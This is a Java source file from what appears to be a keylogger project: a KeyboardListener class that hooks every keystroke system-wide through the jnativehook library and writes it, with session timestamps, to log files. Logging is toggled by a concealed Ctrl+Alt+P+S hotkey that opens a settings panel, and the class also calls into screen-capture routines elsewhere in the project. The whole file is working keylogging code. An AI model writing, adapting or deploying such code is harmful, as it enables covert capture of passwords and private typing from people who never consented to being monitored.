package keylog;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Date;

import gui.SettingsPanel;
import io.File;
import io.LogFile;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import static debug.DebugSettings.debug;
public class KeyboardListener implements NativeKeyListener{
	
	private boolean Started = false;
	
	private static boolean PermissionEnabled = false;
	
	//----------------------------------------
	private boolean Control = false;
	private boolean Alt = false;
	private boolean P = false;
	private boolean S = false;
	//---------------------------------------
	
	private static boolean HotKeyOnce = false;
	
	private LogFile LogFile;
	
	
	@Override
	public void keyPressed(NativeKeyEvent arg0) {
		debug(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
		
		if (arg0.getKeyCode() == NativeKeyEvent.VK_CONTROL)
			Control = true;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_ALT)
			Alt = true;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_P)
			P = true;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_S)
			S = true;
		
		
		if (Control && Alt && P && S && !HotKeyOnce ){
			new SettingsPanel().setVisible(true);
			debug("Shortcut Found.Open GUI");
			PermissionEnabled = false;
			HotKeyOnce = true;
			if (Started){
				Main.GetKeyLogger().StopSession();
				Main.GetKeyLogger().StopListening();
				Main.GetKeyLogger().StopScreenCapturing();
			}//if already started than it was record keys so stop it
				
		}//if hot key
		
		
		//When the user hasn't pressed control and alt to be ready to go on hotkey mode
		if (LogFile!=null && !Control && !Alt && PermissionEnabled){
			
				if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Space") )
					LogFile.Write(" ");
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Backspace") ){
					LogFile.WriteLine("");
					LogFile.Write("[Backspace] ");
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Alt") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Alt] ");
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Up") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Up] ");
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Down") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Down] ");
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Enter") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Enter] ");			
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Right") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Right] ");			
				}				
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Left") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Left] ");			
				}				
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Page Up") ){
					LogFile.WriteLine("");					
					LogFile.Write("[PageUp] ");			
				}	
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Page Down") ){
					LogFile.WriteLine("");					
					LogFile.Write("[PageDown] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Home") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Home] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Back Quote") ){
					LogFile.WriteLine("");					
					LogFile.Write("[BackQuote] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("End") ){
					LogFile.WriteLine("");					
					LogFile.Write("[End] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Tab") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Tab] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Delete") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Delete] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Insert") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Insert] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Pause") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Pause] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Print Screen") ){
					LogFile.WriteLine("");					
					LogFile.Write("[PrintScreen] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Context Menu") ){
					LogFile.WriteLine("");					
					LogFile.Write("[ContextMenu] ");			
				}				
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Ctrl") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Ctrl] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Shift") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Shift] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Minus") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Minus] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Equals") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Equals] ");			
				}	
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Open Bracket") ){
					LogFile.WriteLine("");					
					LogFile.Write("[OpenBracket] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Caps Lock") ){
					LogFile.WriteLine("");					
					LogFile.Write("[CapsLock] ");			
				}									
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("NumPad") ){
					LogFile.WriteLine("");					
					LogFile.Write("[NumPad] ");			
				}	
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Comma") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Comma] ");			
				}		
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Semicolon") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Semicolon] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F1") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F1] ");			
				}			
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F2") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F2] ");			
				}			
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F3") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F3] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F4") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F4] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F5") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F5] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F6") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F6] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F7") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F7] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F8") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F8] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F9") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F9] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F10") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F10] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F11") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F11] ");			
				}						
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("F12") ){
					LogFile.WriteLine("");					
					LogFile.Write("[F12] ");			
				}
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Windows") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Windows] ");			
				}				
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Undefined") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Undefined] ");			
				}					
				else if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Period") ){
					LogFile.WriteLine("");					
					LogFile.Write("[Period] ");			
				}						
				else					
					LogFile.Write(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
			
		}//if log mode
		//else
			//debugl(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
	}//keyPressed

	@Override
	public void keyReleased(NativeKeyEvent arg0){

		if (arg0.getKeyCode() == NativeKeyEvent.VK_CONTROL)
			Control = false;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_ALT)
			Alt = false;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_P)
			P = false;
		else if (arg0.getKeyCode() == NativeKeyEvent.VK_S)
			S = false;	
	
	
	}//keyReleased
	
	
	public KeyboardListener(){
		SetOutput(KeyboardListener.LOG_MODE);
	}//KeyboardListener
	
	public void SetOutput(int _MODE){
		if (_MODE == DEBUG_MODE){
			LogFile = null;
			debug("KeyboardListener: Debugging Mode Selected");
		}//debug mode
		else if (_MODE == LOG_MODE){
			java.io.File dir = new java.io.File("logs");
			dir.mkdir();
			LogFile = new LogFile(dir.getAbsolutePath()+"\\"+File.FindName(false));
			debug("KeyboardListener: Log Mode Selected");
		}//log mode
	}//SetOutput
	
	public void StartSession(){
		Started = true;
		if (LogFile!=null){
			LogFile.Write("#Session Started at ");
			Format formatter;
			formatter = new SimpleDateFormat("E, dd MMM yyyy HH:mm:ss");
			LogFile.WriteLine( formatter.format(new Date()) );				
			LogFile.WriteLine("#");
			SetPermission(true);
		}//if log mode		
	}//StartSession
	
	public void StopSession(){
		Started = false;
		debug("KeyboardListener Stopped.");
		
		Format formatter;
		formatter = new SimpleDateFormat("E, dd MMM yyyy HH:mm:ss");
		LogFile.WriteLine("#Session Ended at ");
		LogFile.WriteLine( formatter.format(new Date()) );
		SetPermission(false);
	}//StopSession()
	
	
	
	public void StartListening(){
			GlobalScreen.getInstance().addNativeKeyListener(this);
			debug("KeyboardListener Started.");
	}//StartLinstening
	
	public void StopListening(){
		GlobalScreen.getInstance().removeNativeKeyListener(this);
		Started = false;
		debug("Removed Listener");
	}//StopListening
	
	
	public static int LOG_MODE = 1;
	public static int DEBUG_MODE = 2;
	
	public static void SetPermission(boolean b){PermissionEnabled = b;}
	
	public boolean GetStarted(){return Started;}
	
	public boolean GetControl(){return Control;}
	public boolean GetAlt(){return Alt;}
	
	public LogFile GetLogFile(){return LogFile;}
	public boolean IsReady(){return (!Alt && !Control && Started && PermissionEnabled);}
	

}//KeyboardListener